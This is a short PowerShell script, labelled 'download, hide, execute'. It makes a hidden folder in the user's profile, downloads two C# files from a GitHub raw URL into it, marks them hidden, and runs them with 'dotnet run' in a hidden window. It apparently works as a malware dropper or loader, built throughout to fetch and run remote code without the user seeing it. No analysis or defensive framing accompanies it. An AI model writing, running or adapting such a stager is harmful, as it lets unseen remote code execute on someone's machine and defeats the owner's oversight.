# ============================================
# pp.ps1 - download, hide, execute (FIXED)
# ============================================

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = Join-Path $env:USERPROFILE ".configs"
if (-not (Test-Path -Path $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}


$d = Get-Item -LiteralPath $configPath -Force
$d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden


function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ---- 1. pypy.py (source = client.cs) ----
$finalPath = Join-Path $configPath "client.cs"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs" -Path $finalPath


# ---- 2. auto.cs ----
$finalPath3 = Join-Path $configPath "auto.cs"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs" -Path $finalPath3

# ---- 5. Launch ----

Push-Location -LiteralPath $configPath

Start-Process -FilePath 'dotnet' -ArgumentList @('run', 'auto.cs', '--', 'client.cs', '--hidden') -WindowStyle Hidden


